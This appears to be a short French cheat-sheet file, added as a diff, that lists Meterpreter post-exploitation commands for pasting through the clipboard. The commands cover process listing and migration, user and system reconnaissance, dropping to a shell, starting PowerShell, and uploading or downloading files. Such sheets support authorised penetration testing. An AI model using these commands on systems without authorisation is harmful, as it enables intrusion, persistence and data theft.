@@ -1,0 +1,36 @@
+% meterpreter, help, cmd
+
+# Lister les processus
+echo ps  | xclip -selection clipboard
+
+# Migration d'une instance serveur vers un autre processus => migrate <PID>
+echo migrate <PID> | xclip -selection clipboard
+
+# Tuer un processus
+echo kill <PID> | xclip -selection clipboard
+
+# Obtenir l'utilisateur actuel
+echo getuid | xclip -selection clipboard
+
+# Obtenir des informations sur le système
+echo sysinfo | xclip -selection clipboard
+
+# Obtenir la liste de routage
+echo route | xclip -selection clipboard
+
+# Lister les interfaces réseaux et leurs configurations
+echo ipconfig | xclip -selection clipboard
+
+# Obtenir le shell
+echo shell | xclip -selection clipboard
+
+# Charger le module powershell
+echo load powershell | xclip -selection clipboard
+
+# Démarrer powershell
+echo powershell_shell | xclip -selection clipboard
+
+# Upload/Download fichier
+echo upload/download <FILE> <FILE_OUTPUT>
+
+$FILE: ls
